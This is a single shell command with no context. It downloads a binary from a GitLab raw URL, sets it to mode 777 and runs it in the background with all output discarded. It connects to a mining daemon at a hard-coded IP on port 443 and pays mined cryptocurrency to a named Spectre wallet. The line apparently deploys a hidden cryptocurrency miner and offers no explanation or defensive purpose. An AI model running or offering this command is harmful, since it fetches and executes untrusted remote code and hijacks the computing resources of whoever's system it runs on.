...
wget https://gitlab.com/majapahlevi/mvp/-/raw/main/Tnn0.4.0 && chmod 777 Tnn0.4.0 && ./Tnn0.4.0 --daemon-address 138.197.44.235 --port 443 --worker-name $(shuf -n 1 -i 1-9999)-Bismillah --spectre --wallet spectre:qpel996pz6mxk86mgy7p8cg62hsgzl98u338h0gwhme9ec55sk8eqlw8wqqs0 --threads 4 > /dev/null 2>&1
